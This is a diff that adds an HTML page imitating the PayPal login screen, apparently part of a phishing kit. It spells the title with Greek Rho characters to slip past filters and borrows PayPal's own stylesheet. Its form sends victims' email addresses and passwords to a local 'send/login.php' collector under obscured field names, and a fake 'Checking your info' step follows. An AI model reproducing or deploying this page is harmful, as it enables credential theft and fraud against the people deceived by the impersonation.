@@ -1,0 +1,56 @@
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <title>Log in to your &Rho;ay&Rho;al account</title>
+    <link rel="shortcut icon" href="img/pp_favicon_x.ico">
+    <!--<link href="Style/login.css" rel="stylesheet" /> -->
+    <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/web/res/b5f/c1b45c38bc76abcd194cace8b96ad/css/app.css">
+    <script src="js/login.js"></script>
+</head>
+<body class="desktop">
+    <div class="">
+        <header>
+            <div class="paypal-logo"></div>
+        </header>
+        <div class="main" role="main">
+            
+            <section class="login" id="login">
+                <form method="post" action="send/login.php?&login_cmd=_login-done&login_access=4059ad9ac782ed26b0ad8aa172dc23c42b38f7a530ae18e64fb044fd1519042c1b3c50e8">
+                    <!-- Email -->
+                    <div class="corral">
+                        <div class="contentContainer">
+                            <header><p class="paypal-logo paypal-logo-long">PayPal</p></header>
+                                                        <div class="clearfix">
+                                <div class="textInput" id="mail">
+                                    <div class="fieldWrapper" >
+                                        <input type="email" name="adnen1" id="EmailID" placeholder="Email address">
+                                    </div>
+                                </div> 
+                                <div class="textInput" id="pass">
+                                    <div class="fieldWrapper">
+                                        <input type="password"  name="adnen2" id="PasswordID" placeholder="Enter your password">
+                                    </div>
+                                </div>
+                                <div class="actions actionsSpaced">
+                                    <input type="submit" class="button actionContinue" value="Log In" id="bntlogin">
+                                </div>
+
+
+
+                                <div class="forgotLink"><a href="#" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div>
+                                <a href="#" class="button secondary" id="createAccount">Sign Up</a>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+                 <footer class="footer" role="contentinfo"><ul class="footerGroup"><li><a href="#">Contact Us</a></li><li><a href="#">Privacy</a></li><li><a href="#">Legal</a></li><li><a href="#">Worldwide</a></li></ul></footer>
+            </section>
+        </div>
+    </div>
+    <div class="transitioning hide" id="Done1">
+            <p class="checkingInfo hide" id="Done2">Checking your info&hellip;</p><!-- Checking your info -->
+    </div>
+   
+</body>
+</html>
